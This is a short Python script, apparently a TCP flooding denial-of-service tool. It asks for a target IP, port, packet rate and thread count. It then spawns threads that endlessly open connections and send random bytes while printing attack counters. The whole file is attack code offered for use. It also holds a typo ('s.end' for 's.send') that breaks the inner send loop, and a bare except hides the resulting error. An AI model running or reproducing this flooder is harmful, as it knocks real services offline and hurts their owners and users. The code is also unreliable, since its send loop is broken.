import socket
import random
import threading

ip = str(input('[+] Target: '))
port = int(input('[+] port: '))
pack = int(input('[+] packet/s: '))
thread = int(input('[+] Threads: '))

def start():
    hh = random._urandom(10)
    xx = int(0)
    while True:
        try:
            s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
            s.connect((ip,port))
            s.send(hh)
            for i in range(pack):
                s.end(hh)
            xx +=1
            print('Atacking'+ ip+' | Sent: '+str(xx))
        except:
            s.close()
            print('Done')
for x in range(thread):
    thred = threading.Thread(target=start)
    thred.start()
